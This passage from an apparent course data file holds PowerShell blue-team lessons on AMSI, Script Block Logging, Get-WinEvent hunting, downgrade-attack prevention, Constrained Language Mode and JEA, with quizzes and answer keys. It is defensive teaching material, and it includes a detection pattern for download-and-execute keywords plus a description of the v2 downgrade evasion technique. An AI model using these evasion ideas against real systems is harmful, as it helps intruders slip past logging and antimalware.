---------- --------                        ----
amsi.dll   C:\\WINDOWS\\SYSTEM32\\amsi.dll  135168`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Using `[System.Text.Encoding]::UTF8` when decoding a PowerShell `-EncodedCommand` string and seeing spaces or null bytes between every character.',
        cause: '`powershell.exe -EncodedCommand` always uses 16-bit **`[System.Text.Encoding]::Unicode`** (`UTF-16LE`), not `UTF8`.',
        fix: 'Always use `[System.Text.Encoding]::Unicode.GetString(...)` when decoding `-EncodedCommand` strings.',
      },
      {
        mistake: 'Decoding a suspicious Base64 string and then pasting the result into the console, or piping it to `Invoke-Expression`, "to see what it does".',
        cause: 'Decoding only turns bytes into text. Running that text executes whatever the attacker wrote.',
        fix: 'Decode to a string, print it with `Write-Output` or save it to a text file, read it, and only ever detonate samples inside an isolated lab VM with a snapshot, never on a work machine.',
      },
      {
        mistake: 'Believing "AMSI is on, so we are protected" and skipping log forwarding and EDR.',
        cause: 'AMSI depends on the antimalware engine and its signatures, and it can be bypassed by someone with enough access.',
        fix: 'Use AMSI together with 4104 logging forwarded off the host, 1102 (log cleared) alerts, an EDR, and WDAC/AppLocker.',
      },
    ],
    tryItYourself: [
      'Decode this mystery Base64 string using our SOC one-liner: `[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("RwBlAHQALQBEAGEAdABlAA=="))`.',
      'Run `(Get-Process -Id $PID).Modules | Where-Object ModuleName -eq "amsi.dll"` to see that `amsi.dll` is loaded in your own PowerShell session (it is the hook point, not a promise that every script is blocked).',
    ],
    knowledgeCheck: [
      {
        question: 'How does AMSI (Antimalware Scan Interface) help against Base64 encoding and string concatenation obfuscation in PowerShell, and what is its limit?',
        options: [
          'It blocks the keyboard from typing Base64, so nothing can get through',
          'amsi.dll lets the PowerShell engine hand the final, de-obfuscated script text to the antimalware product just before execution, but it is not a guarantee: it depends on that product and can be bypassed, so you also need 4104 logging, EDR and application control',
          'It only scans .txt files on disk and never sees PowerShell',
          'It guarantees every malicious script is blocked, so no other logging is needed',
        ],
        correctIndex: 1,
        explanation: 'However a script is obfuscated in transit, the interpreter must reconstruct the plain text to run it, and that is when AMSI can scan it. AMSI relies on the installed antimalware product and can be evaded, which is why defence in depth matters.',
      },
      {
        question: 'Which .NET text encoding does `powershell.exe -EncodedCommand` use?',
        options: [
          'ASCII (7-bit)',
          'Unicode (UTF-16LE)',
          'EBCDIC',
          'Hexadecimal',
        ],
        correctIndex: 1,
        explanation: 'PowerShell -EncodedCommand expects Base64-encoded UTF-16LE ([System.Text.Encoding]::Unicode) bytes.',
      },
    ],
  },

  // ==========================================================================
  // CHAPTER 16: BLUE TEAM FORENSICS, THREAT HUNTING & ENTERPRISE HARDENING
  // ==========================================================================
  {
    id: '16-1',
    chapterId: 'chapter-16',
    slug: 'powershell-auditing-and-logging',
    title: 'The Blue Team Superpower: Script Block Logging (4104), Transcription & Get-WinEvent',
    subtitle: 'Why obfuscation does not hide code from Event ID 4104, and how to query forensic event logs with surgical speed',
    estimatedMinutes: 35,
    oneSentenceSummary:
      'Enabling the three pillars of PowerShell telemetry - **Script Block Logging (Event ID 4104)**, **Module Logging (Event ID 4103)**, and **System-Wide Transcription** - records the decoded code that actually ran, ready to hunt with `Get-WinEvent -FilterHashtable`.',
    summary:
      'Years ago, attackers loved PowerShell because they thought running commands in memory left no forensic trace on disk. Since PowerShell 5, Microsoft has added strong auditing: Script Block Logging, Module Logging and Transcription. In this lesson, we configure the **three pillars of PowerShell logging** (`Event ID 4104`, `Event ID 4103`, and `Start-Transcript`), learn why `Get-WinEvent -FilterHashtable` is much faster than filtering after the fact (and works where legacy `Get-EventLog` does not), and hunt for suspicious scripts and failed logons (`Event ID 4625`). Registry and audit-policy changes here are **lab VM only** and come with undo steps.',
    whyItMatters:
      'When an incident happens, **Event ID 4104 (`Microsoft-Windows-PowerShell/Operational`)** is the single most valuable log on the machine: it records the **full, de-obfuscated source code** of every scriptblock that executed in memory, even if the attacker deleted the script or used `IEX`!',
    learningObjectives: [
      'Configure the 3 pillars of PowerShell telemetry: **Script Block Logging (Event ID 4104)**, **Module/Pipeline Logging (Event ID 4103)**, and **Transcription (`Start-Transcript`)**',
      'Explain why Event ID `4104` automatically logs suspicious commands (like `Invoke-Expression`, `Get-Credential`, or `DownloadString`) at `Warning` level even before full logging is turned on',
      'Memorize the key Windows forensic Event IDs: **`4104`** (Script Block), **`4103`** (Module Pipeline), **`4688`** (Process Creation), **`4624`** (Successful Logon), and **`4625`** (Failed Logon)',
      'Query event logs at native speed using `Get-WinEvent -FilterHashtable @{ LogName = ...; Id = ... }`',
    ],
    keyTerms: [
      'Event ID 4104 (Script Block Logging)',
      'Event ID 4103 (Module / Pipeline Logging)',
      'System-Wide Transcription (Start-Transcript)',
      'Get-WinEvent -FilterHashtable',
      'Microsoft-Windows-PowerShell/Operational',
      'Event ID 4624 / 4625 / 4688 (Security Log)',
    ],
    conceptSections: [
      {
        heading: 'The Holy Trinity of PowerShell Telemetry: 4104, 4103 & Transcription',
        body: [
          'Every Blue Team engineer and SOC analyst configures three complementary layers of PowerShell visibility via Group Policy (`Administrative Templates → Windows Components → Windows PowerShell`):\n1. **Script Block Logging (`Event ID 4104` in `Microsoft-Windows-PowerShell/Operational`):**\n   Records the **complete, de-obfuscated code block** as the PowerShell engine compiles it in memory! Even if an attacker runs a 3-layer Base64 `IEX` cradle from memory, Event ID `4104` captures the final plain-text script that actually executed!\n2. **Module / Pipeline Logging (`Event ID 4103`):**\n   Records every pipeline execution, including parameter bindings and the output objects produced by specified modules (`*`).\n3. **System-Wide Transcription (or `Start-Transcript` / `Stop-Transcript`):**\n   Records an exact, "over-the-shoulder" text log of everything typed into the console AND everything printed back to the screen into a timestamped `.txt` file on a write-only network share!',
        ],
      },
      {
        heading: 'Surgical Threat Hunting with Get-WinEvent -FilterHashtable',
        body: [
          'Never use `Get-EventLog` (it is deprecated, doesn’t exist in PowerShell 7, and cannot read modern `Applications and Services Logs` like `Microsoft-Windows-PowerShell/Operational`). Always use **`Get-WinEvent`**!',
          'And remember our **Filter Left** law from Chapter 7? Never run `Get-WinEvent -LogName Security | Where-Object Id -eq 4625` on a 2 GB Security log! Instead, pass a hashtable to **`-FilterHashtable`**:\n```powershell\nGet-WinEvent -FilterHashtable @{\n    LogName   = "Microsoft-Windows-PowerShell/Operational"\n    Id        = 4104\n    StartTime = (Get-Date).AddHours(-24)\n}\n```\nThe Windows Event Log engine filters at the source in milliseconds!',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: 'Event ID `4104` (`Microsoft-Windows-PowerShell/Operational`) captures the fully decoded source code of in-memory scripts, and `Get-WinEvent -FilterHashtable` queries it at native speed.',
      },
      {
        type: 'pro',
        title: 'The 5 Event IDs Every Security Engineer Knows by Heart',
        body: '• **`4104`** (`PowerShell/Operational`): Executed PowerShell Script Block (decoded code)\n• **`4103`** (`PowerShell/Operational`): Module Pipeline Execution & Parameter Binding\n• **`4688`** (`Security`): New Process Created (parent process always; the **command line is only included if you enable two things**: the audit policy *Audit Process Creation* (`auditpol /set /subcategory:"Process Creation" /success:enable`) **and** the setting *Include command line in process creation events*, registry value `ProcessCreationIncludeCmdLine_Enabled = 1` or the matching Group Policy)\n• **`4624`** (`Security`): Successful Account Logon (`LogonType 3` = Network, `10` = RDP)\n• **`4625`** (`Security`): Failed Account Logon (Brute-Force / Password Spraying)',
      },
      {
        type: 'gotcha',
        title: 'Lab Only: Registry Policy Changes and How to Undo Them',
        body: 'The registry changes in the code example below switch on logging in the lab. In a real environment you set these through Group Policy (so they are managed, documented and reversible), not by hand on one machine. To undo them in the lab:\n• `Remove-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" -Name EnableScriptBlockLogging`\n• `Remove-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit" -Name ProcessCreationIncludeCmdLine_Enabled`\n• `auditpol /set /subcategory:"Process Creation" /success:disable`\nMore logging means more disk and more noise: size the log (`wevtutil gl Microsoft-Windows-PowerShell/Operational`) and forward events to a central place. Remember that logs can hold secrets that were typed into scripts.',
      },
      {
        type: 'try',
        title: 'Record Your Own Session with Start-Transcript',
        body: 'Run `Start-Transcript -Path "$env:TEMP\\my-session.txt"`, run two or three commands, and then run `Stop-Transcript`. Open `$env:TEMP\\my-session.txt` to see the complete forensic header and command transcript!',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'Get-WinEvent',
        aliases: [],
        syntax: 'Get-WinEvent -FilterHashtable <Hashtable> [-MaxEvents <Int64>] [-ComputerName <String>]',
        parameters: [
          {
            name: '-FilterHashtable',
            type: 'Hashtable',
            description: 'High-speed source filter accepting keys: LogName, Id, Level, StartTime, EndTime, ProviderName.',
          },
          {
            name: '-MaxEvents',
            type: 'Int64',
            description: 'Limits the maximum number of matching events returned (much faster than piping to Select-Object -First!).',
          },
        ],
        examples: [
          'Get-WinEvent -FilterHashtable @{ LogName = "Microsoft-Windows-PowerShell/Operational"; Id = 4104 } -MaxEvents 10',
        ],
      },
      {
        cmdlet: 'Start-Transcript',
        aliases: [],
        syntax: 'Start-Transcript [[-Path] <String>] [-Append]',
        parameters: [
          {
            name: '-Path',
            type: 'String',
            description: 'Specifies the file path where the session transcript will be recorded.',
          },
        ],
        examples: ['Start-Transcript -Path C:\\Logs\\SessionAudit.txt'],
      },
    ],
    codeExamples: [
      {
        title: 'Enabling Script Block Logging (4104) via Registry and Hunting Malicious ScriptBlocks',
        description: 'Lab VM only. Enable PowerShell Script Block Logging (4104) and the prerequisites for the 4688 command line, then hunt for suspicious keywords inside Event ID 4104 logs. Undo steps are in the callout above.',
        code: `# 1. LAB VM ONLY: enable Script Block Logging (Event ID 4104) via registry policy
#    (Production: use Group Policy. Undo: Remove-ItemProperty on the same path/name.)
$sbPath = 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging'
New-Item -Path $sbPath -Force | Out-Null
Set-ItemProperty -Path $sbPath -Name 'EnableScriptBlockLogging' -Value 1

# 1b. LAB VM ONLY: make Event 4688 carry the command line (needs BOTH settings)
auditpol /set /subcategory:"Process Creation" /success:enable
$auditPath = 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit'
New-Item -Path $auditPath -Force | Out-Null
Set-ItemProperty -Path $auditPath -Name 'ProcessCreationIncludeCmdLine_Enabled' -Value 1 -Type DWord

# 2. Hunt Event ID 4104 for suspicious tradecraft keywords (IEX, DownloadString, FromBase64String, amsi)
Get-WinEvent -FilterHashtable @{
  LogName = 'Microsoft-Windows-PowerShell/Operational'
  Id      = 4104
} -MaxEvents 50 |
  Where-Object { $_.Message -match 'Invoke-Expression|DownloadString|FromBase64String|adsisearcher' } |
  Select-Object TimeCreated, Id, LevelDisplayName, @{
    Name       = 'Snippet'
    Expression = { $_.Message.Substring(0, [math]::Min(90, $_.Message.Length)) }
  }

# 3. Hunt Failed Logon Attempts (Event ID 4625) in the last 24 hours
Get-WinEvent -FilterHashtable @{
  LogName   = 'Security'
  Id        = 4625
  StartTime = (Get-Date).AddHours(-24)
} -MaxEvents 5 -ErrorAction SilentlyContinue |
  Select-Object TimeCreated, Id, MachineName`,
        output: `TimeCreated            Id LevelDisplayName Snippet
-----------            -- ---------------- -------
11/3/2026 11:58:12 PM 4104 Warning          Creating Scriptblock text (1 of 1): [System.Text.Encoding]::Unicode.GetString([System...`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Running `Get-WinEvent -LogName Security | Where-Object Id -eq 4625` on a production Domain Controller.',
        cause: 'Pulling millions of Security events across the pipeline before checking the Event ID takes minutes and spikes CPU.',
        fix: 'Always filter at the source with `Get-WinEvent -FilterHashtable @{ LogName = "Security"; Id = 4625 } -MaxEvents 20`.',
      },
    ],
    tryItYourself: [
      'Run `Get-WinEvent -FilterHashtable @{ LogName = "Microsoft-Windows-PowerShell/Operational"; Id = 4104 } -MaxEvents 5 | Select-Object TimeCreated, Id, Message` on your Windows machine to see real Script Block logs.',
      'Run `Start-Transcript`, execute `Get-Date`, and run `Stop-Transcript` to inspect the generated transcript file.',
    ],
    knowledgeCheck: [
      {
        question: 'Which Windows Event ID inside `Microsoft-Windows-PowerShell/Operational` records the full, de-obfuscated source code of executed PowerShell scriptblocks?',
        options: ['Event ID 1000', 'Event ID 4104', 'Event ID 4624', 'Event ID 7045'],
        correctIndex: 1,
        explanation: 'Event ID 4104 (Script Block Logging) captures the compiled, decoded text of PowerShell scriptblocks executed in memory.',
      },
      {
        question: 'Why should you use `Get-WinEvent -FilterHashtable @{ LogName="Security"; Id=4625 }` instead of `Get-WinEvent -LogName Security | Where-Object Id -eq 4625`?',
        options: [
          'Where-Object cannot compare numbers',
          '-FilterHashtable filters at the Windows Event Log engine level before constructing .NET objects, which is usually far faster',
          'Get-WinEvent does not support pipes',
          'Event ID 4625 only exists in hashtable format',
        ],
        correctIndex: 1,
        explanation: 'Passing -FilterHashtable applies the Filter Left principle so the OS Event Log service returns only matching Event IDs.',
      },
    ],
  },

  {
    id: '16-2',
    chapterId: 'chapter-16',
    slug: 'hardening-jea-and-threat-hunting',
    title: 'Enterprise Hardening: Constrained Language Mode, JEA & Stopping v2 Downgrades',
    subtitle: 'Remove PowerShell 2.0 where it exists, understand why CLM needs AppLocker/WDAC, and build a least-privilege JEA endpoint end to end (lab: DC01)',
    estimatedMinutes: 30,
    oneSentenceSummary:
      'Harden enterprise PowerShell in layers: remove the legacy `MicrosoftWindowsPowerShellV2` engine where it is still present (stopping downgrade attacks), enforce **Constrained Language Mode (CLM)** through AppLocker/WDAC, and use **Just Enough Administration (JEA)** so operators only get the exact commands they need, and nothing more.',
    summary:
      'In our final lesson, we bring every track of this academy, Windows Internals, PowerShell Core, Enterprise Infrastructure, and Red/Blue Team Security, together into an **Enterprise Hardening Blueprint**. You will learn how attackers try to sidestep AMSI and Event ID 4104 using a **PowerShell v2.0 Downgrade Attack** (and how to close that hole), how **Constrained Language Mode (CLM)** limits arbitrary `.NET` and Win32 API use while keeping core cmdlets working (when enforced by AppLocker or WDAC), and how **Just Enough Administration (JEA)** lets a DNS or Helpdesk operator manage a server via WinRM without making them a full Local Administrator. Lab setup: see the Lab Setup page. JEA registration is done in the lab on `DC01`.',
    whyItMatters:
      'Implementing these controls together (removing PowerShell v2 where present, enforcing CLM via AppLocker/WDAC, and deploying JEA endpoints) turns your Windows environment from a soft target into a much harder one. No single control is a boundary on its own; the layers are the point.',
    learningObjectives: [
      'Explain why attackers run `powershell.exe -Version 2` (PowerShell Downgrade Attack) to evade AMSI and Event ID 4104, and remove the v2 feature permanently',
      'Compare **`FullLanguage`** mode with **`ConstrainedLanguage` (CLM)** (`$ExecutionContext.SessionState.LanguageMode`) and explain what CLM blocks',
      'Architect **Just Enough Administration (JEA)** using Role Capability files (`.psrc`) and Session Configuration files (`.pssc`)',
      'Explain how JEA’s **Virtual Account (`RunAsVirtualAccount = $true`)** lets a non-admin run specific elevated tasks via WinRM without receiving admin credentials, and that the virtual account itself is a powerful local administrator (domain-admin context on a DC)',
    ],
    keyTerms: [
      'PowerShell v2.0 Downgrade Attack',
      'Constrained Language Mode (CLM)',
      '$ExecutionContext.SessionState.LanguageMode',
      'Just Enough Administration (JEA)',
      'Role Capability File (.psrc) & Session Config (.pssc)',
      'RunAsVirtualAccount (Least-Privilege WinRM)',
    ],
    conceptSections: [
      {
        heading: 'Closing a Bypass Hole: Stopping PowerShell v2.0 Downgrade Attacks',
        body: [
          'In Lesson 15-2 and 16-1, we saw that **AMSI** and **Script Block Logging (Event ID 4104)** were introduced in **PowerShell 5.0/5.1**. What if an older Windows installation still has the legacy **Windows PowerShell 2.0 Engine** optional feature installed, and an attacker types:\n`powershell.exe -Version 2 -Command "..."`?',
          'If PowerShell 2.0 is still installed, PowerShell can boot the ancient 2009 v2.0 engine, which has **no AMSI integration and no Script Block Logging (4104)!** That is called a **PowerShell Downgrade Attack**.\n• **How to audit and remove it:**\n  `Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root`\n  `Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root -NoRestart`\n• **It may not be there at all.** Newer builds (Windows 11 24H2 and Windows Server 2025, which is our lab OS) no longer ship PowerShell 2.0, so the audit command can return nothing or an error. That is good news, not a bug. Handle the empty result in your script (the code example does).',
        ],
      },
      {
        heading: 'Constrained Language Mode (CLM): Limiting Arbitrary .NET Use (When Policy Enforces It)',
        body: [
          'Remember how the recon scripts in Chapter 15 used raw `.NET` classes like `New-Object System.Net.WebClient`, `[adsisearcher]`, or inline C# (`Add-Type`)? Normal PowerShell runs in **`FullLanguage`** mode, which allows full access to the entire `.NET` framework.',
          'When you enforce **AppLocker** or **Windows Defender Application Control (WDAC)** on an endpoint, scripts that are not trusted are run in **`ConstrainedLanguage` (CLM)** mode.\n• **What still works in CLM?** Native signed cmdlets (`Get-Process`, `Get-Service`, `Stop-Process`, pipelines, loops, variables).\n• **What is restricted in CLM?** Arbitrary `.NET` type creation (`New-Object Net.WebClient`), most type accelerators like `[adsisearcher]`, COM objects, and `Add-Type` C# compilation. This raises the cost of many common techniques a lot.\n• **CLM is not a security boundary on its own.** Setting the language mode by hand only affects that one session, and it is only trustworthy when a real policy (AppLocker or WDAC) enforces it and also controls which scripts and binaries may run. Combine it with logging (4104), AMSI/EDR and JEA.\n• Check your current language mode right now: **`$ExecutionContext.SessionState.LanguageMode`**.',
        ],
      },
      {
        heading: 'Just Enough Administration (JEA): Zero-Standing-Privilege Remoting',
        body: [
          'Remember my #1 rule from Lesson 1-1: **The Principle of Least Privilege**? Suppose a junior Helpdesk engineer needs to restart the `Spooler` and `DNS` services and flush the DNS cache on a Domain Controller via WinRM. In the old days, you had to put them in the **`Domain Admins`** or **`Administrators`** group, giving them total power to dump `lsass.exe` or delete the domain!',
          '**Just Enough Administration (JEA)** solves this inside WinRM. A working endpoint needs **all five** of these steps (the lesson used to stop after two):\n1. **Role Capability File (`.psrc` - `New-PSRoleCapabilityFile`):** Lists the **exact commands and parameter values** the role may use. Restrict `Restart-Service` with a `ValidateSet` (or wrap it in a constrained function), because exposing plain `Restart-Service` would let the user restart *any* service. Every command you do not list simply does not exist in their session.\n2. **Put the `.psrc` where JEA can find it:** inside a PowerShell module, in a `RoleCapabilities` folder (for example `C:\\Program Files\\WindowsPowerShell\\Modules\\DnsHelpdesk\\RoleCapabilities\\DnsHelpdesk.psrc`).\n3. **Session Configuration File (`.pssc` - `New-PSSessionConfigurationFile`):** `SessionType = "RestrictedRemoteServer"`, `RunAsVirtualAccount`, a `TranscriptDirectory`, and **`RoleDefinitions`** that map a group to the role (for example `@{ "CORP\\GRP_Helpdesk" = @{ RoleCapabilities = "DnsHelpdesk" } }`). Without `RoleDefinitions` nobody gets any commands.\n4. **Register the endpoint:** `Register-PSSessionConfiguration -Name HelpdeskJEA -Path .\\HelpdeskJEA.pssc -Force` (this restarts WinRM, so do it in the lab). Undo with `Unregister-PSSessionConfiguration -Name HelpdeskJEA`.\n5. **Test it:** `Get-PSSessionCapability -ConfigurationName HelpdeskJEA -Username "CORP\\jdoe"` lists exactly what that user can run, then `Enter-PSSession -ComputerName DC01 -ConfigurationName HelpdeskJEA`.',
          '**Know what the virtual account is.** With `RunAsVirtualAccount`, the allowed commands run as a temporary account that is a **local administrator** on that machine (and on a domain controller that means a Domain Admin context). The user never sees the credentials, but anything you allow runs with that power. That is why the allow-list must be tiny and tight, and why you can narrow the privileges with `RunAsVirtualAccountGroups` (for example only `DnsAdmins`). Every session is also recorded in the transcript folder.',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: 'Remove PowerShell v2.0 where it exists, enforce `ConstrainedLanguage` mode with WDAC/AppLocker (CLM alone is not a boundary), and use **JEA** (`.psrc` in a module + `.pssc` with `RoleDefinitions` + `Register-PSSessionConfiguration`) to grant tightly limited WinRM privileges without handing out Admin rights.',
      },
      {
        type: 'danger',
        title: 'JEA Is Only as Safe as Its Allow-List',
        body: 'Never expose broad commands such as `Invoke-Expression`, `Start-Process`, `Set-Content` or an unrestricted `Restart-Service` / `Set-Service`. Because the virtual account is an administrator, one loose command can become a way to run anything. Use `ValidateSet` or `ValidatePattern` on every parameter, prefer small constrained functions, review the transcripts, and test with `Get-PSSessionCapability`.',
      },
      {
        type: 'try',
        title: 'Check Your Current PowerShell Language Mode',
        body: 'Run `$ExecutionContext.SessionState.LanguageMode` right now. On a standard admin machine it returns `FullLanguage`; on a WDAC/AppLocker-locked endpoint it returns `ConstrainedLanguage`!',
      },
      {
        type: 'pro',
        title: 'Full-Circle Mastery',
        body: 'Notice how JEA brings us full circle back to Chapter 1’s **Principle of Least Privilege**: instead of securing *machines* by hiding the command line, we use PowerShell itself to enforce least-privilege access at the individual cmdlet and parameter level!',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'New-PSRoleCapabilityFile',
        aliases: [],
        syntax: 'New-PSRoleCapabilityFile -Path <String> [-VisibleCmdlets <Object[]>] [-VisibleFunctions <String[]>]',
        parameters: [
          {
            name: '-Path',
            type: 'String',
            description: 'Path to the .psrc Role Capability file defining which cmdlets and parameters a JEA role can execute.',
          },
          {
            name: '-VisibleCmdlets',
            type: 'Object[]',
            description: 'Whitelist of cmdlets (and allowed parameter values) exposed to the JEA user.',
          },
        ],
        examples: [
          'New-PSRoleCapabilityFile -Path .\\DnsHelpdesk.psrc -VisibleCmdlets @(\'Get-Service\', @{ Name = \'Restart-Service\'; Parameters = @{ Name = \'Name\'; ValidateSet = \'Spooler\', \'DNS\' } }, \'Clear-DnsServerCache\')',
        ],
      },
      {
        cmdlet: 'New-PSSessionConfigurationFile',
        aliases: [],
        syntax: 'New-PSSessionConfigurationFile -Path <String> [-SessionType <SessionType>] [-RunAsVirtualAccount] [-RoleDefinitions <IDictionary>] [-TranscriptDirectory <String>]',
        parameters: [
          {
            name: '-SessionType',
            type: 'SessionType',
            description: 'Set to RestrictedRemoteServer for JEA endpoints so only whitelisted commands exist.',
          },
          {
            name: '-RunAsVirtualAccount',
            type: 'SwitchParameter',
            description: 'Runs the allowed commands as a temporary virtual account that is a local administrator (domain-admin context on a DC). The user never sees its credentials, so keep the allow-list tight. Narrow it with -RunAsVirtualAccountGroups.',
          },
          {
            name: '-RoleDefinitions',
            type: 'IDictionary',
            description: 'Maps a user or group to one or more role capabilities, e.g. @{ "CORP\\GRP_Helpdesk" = @{ RoleCapabilities = "DnsHelpdesk" } }. Without it nobody gets any commands.',
          },
        ],
        examples: [
          'New-PSSessionConfigurationFile -Path .\\HelpdeskJEA.pssc -SessionType RestrictedRemoteServer -RunAsVirtualAccount -TranscriptDirectory C:\\JEALogs -RoleDefinitions @{ \'CORP\\GRP_Helpdesk\' = @{ RoleCapabilities = \'DnsHelpdesk\' } }',
          'Register-PSSessionConfiguration -Name HelpdeskJEA -Path .\\HelpdeskJEA.pssc -Force',
        ],
      },
    ],
    codeExamples: [
      {
        title: 'Enterprise Hardening Audit: Checking PowerShell v2, Language Mode & Building a JEA Endpoint',
        description: 'Check for PowerShell 2.0 (and handle builds where it is gone), inspect the current LanguageMode, and build, register and test a least-privilege JEA endpoint. Lab only, on DC01, in an elevated session.',
        code: `# 1. Audit whether legacy PowerShell v2.0 is still enabled (Downgrade Attack Risk)
#    On newer builds (Windows 11 24H2 / Server 2025) the feature is gone and this returns nothing.
$v2 = Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root -ErrorAction SilentlyContinue
if ($null -eq $v2) {
  Write-Output 'PowerShell 2.0 feature not present on this build: nothing to disable.'
} else {
  $v2 | Select-Object FeatureName, State
  # If State is Enabled: Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root -NoRestart
}

# 2. Check active PowerShell Language Mode (FullLanguage vs ConstrainedLanguage)
Write-Output "Active Language Mode: $($ExecutionContext.SessionState.LanguageMode)"

# 3. Put a Role Capability (.psrc) inside a module so JEA can find it
$modPath = 'C:\\Program Files\\WindowsPowerShell\\Modules\\DnsHelpdesk'
New-Item -ItemType Directory -Path "$modPath\\RoleCapabilities" -Force | Out-Null
New-ModuleManifest -Path "$modPath\\DnsHelpdesk.psd1"
New-PSRoleCapabilityFile -Path "$modPath\\RoleCapabilities\\DnsHelpdesk.psrc" -VisibleCmdlets @(
  'Get-Service',
  'Clear-DnsServerCache',
  # Restart-Service is limited to two named services (NOT all services)
  @{ Name = 'Restart-Service'; Parameters = @{ Name = 'Name'; ValidateSet = 'Spooler', 'DNS' } }
)

# 4. Session Configuration (.pssc): virtual account, transcripts, and WHO gets WHICH role
$psscPath = Join-Path $env:TEMP 'HelpdeskJEA.pssc'
New-PSSessionConfigurationFile -Path $psscPath \`
  -SessionType RestrictedRemoteServer \`
  -RunAsVirtualAccount \`
  -TranscriptDirectory 'C:\\ProgramData\\JEAConfiguration\\Transcripts' \`
  -RoleDefinitions @{ 'CORP\\GRP_Helpdesk' = @{ RoleCapabilities = 'DnsHelpdesk' } }
Test-PSSessionConfigurationFile -Path $psscPath

# 5. Register the endpoint (restarts WinRM; lab only) and test what a user can run
Register-PSSessionConfiguration -Name 'HelpdeskJEA' -Path $psscPath -Force
Get-PSSessionCapability -ConfigurationName 'HelpdeskJEA' -Username 'CORP\\ihaider' |
  Select-Object -First 5 CommandType, Name

# Undo: Unregister-PSSessionConfiguration -Name 'HelpdeskJEA' -Force`,
        output: `PowerShell 2.0 feature not present on this build: nothing to disable.
Active Language Mode: FullLanguage
True

CommandType Name
----------- ----
Function    Clear-Host
Function    Exit-PSSession
Cmdlet      Clear-DnsServerCache
Cmdlet      Get-Service
Cmdlet      Restart-Service`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Setting `$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"` inside a plain `.ps1` script, or treating CLM as a complete defence, without AppLocker or WDAC.',
        cause: 'Setting the variable manually only affects that single window; system-wide Constrained Language Mode must be enforced by an **AppLocker** or **WDAC** policy so untrusted scripts start in CLM automatically. Even then, CLM is one layer, not a boundary on its own.',
        fix: 'Deploy WDAC or AppLocker script enforcement policies via Group Policy or Intune, and keep logging (4104), AMSI/EDR and JEA alongside it.',
      },
      {
        mistake: 'Exposing `Restart-Service` in a JEA role capability with no parameter limits "because the helpdesk only needs Spooler and DNS".',
        cause: 'The allow-list is by command, not by intent. Plain `Restart-Service` lets the operator restart (or via the admin virtual account, disturb) any service.',
        fix: 'Use `ValidateSet` on `-Name` (as in the example) or write a small constrained function that only touches the two services.',
      },
      {
        mistake: 'Creating a `.psrc` and a `.pssc` but never connecting: the endpoint "does nothing".',
        cause: 'The `.psrc` is not inside a module `RoleCapabilities` folder, the `.pssc` has no `RoleDefinitions`, or `Register-PSSessionConfiguration` was never run.',
        fix: 'Follow all five steps, then check `Get-PSSessionConfiguration -Name HelpdeskJEA` and `Get-PSSessionCapability`.',
      },
      {
        mistake: 'Running the PowerShell v2 audit and treating an empty result as an error.',
        cause: 'Windows 11 24H2 and Windows Server 2025 no longer include PowerShell 2.0, so there is nothing to find.',
        fix: 'Check for `$null` (as in the example) and treat "not present" as a pass.',
      },
    ],
    tryItYourself: [
      'Run `$ExecutionContext.SessionState.LanguageMode` in your terminal to inspect your current language mode.',
      'In the lab, build the `DnsHelpdesk` role and `HelpdeskJEA` endpoint on `DC01`, register it, and use `Get-PSSessionCapability` to prove that `Restart-Service` only accepts `Spooler` and `DNS`. Then unregister it.',
    ],
    knowledgeCheck: [
      {
        question: 'Why do attackers attempt a "PowerShell v2.0 Downgrade Attack" (`powershell.exe -Version 2`), and how do defenders prevent it?',
        options: [
          'PowerShell 2.0 is newer and safer; defenders prevent it by unplugging the network cable',
          'PowerShell 2.0 lacks AMSI and Script Block Logging (Event ID 4104); defenders prevent it by removing the MicrosoftWindowsPowerShellV2Root Windows optional feature where it exists',
          'PowerShell 2.0 gives free Domain Admin access',
          'PowerShell 2.0 only runs on macOS',
        ],
        correctIndex: 1,
        explanation: 'The legacy PowerShell 2.0 engine predates AMSI and Event ID 4104 telemetry. Removing the MicrosoftWindowsPowerShellV2Root feature closes the downgrade path (newer builds no longer ship it at all).',
      },
      {
        question: 'What does Just Enough Administration (JEA) with `RunAsVirtualAccount` allow you to accomplish, and what must you remember about it?',
        options: [
          'Give every employee full Domain Admin rights',
          'Let non-admin operators connect via WinRM and run only an allow-listed set of commands and parameters, while the commands run as a temporary virtual account that is itself a local administrator, so the allow-list must be tight',
          'Disable WinRM on all servers',
          'Turn off the Windows Firewall',
        ],
        correctIndex: 1,
        explanation: 'JEA restricts a WinRM endpoint to the commands and parameters in the role capability (.psrc), mapped to groups by RoleDefinitions in the session configuration (.pssc) that you register, and runs them under a virtual account with transcription. Because that account is an administrator, one over-broad command (such as an unrestricted Restart-Service) is a risk.',
      },
    ],
  },
];
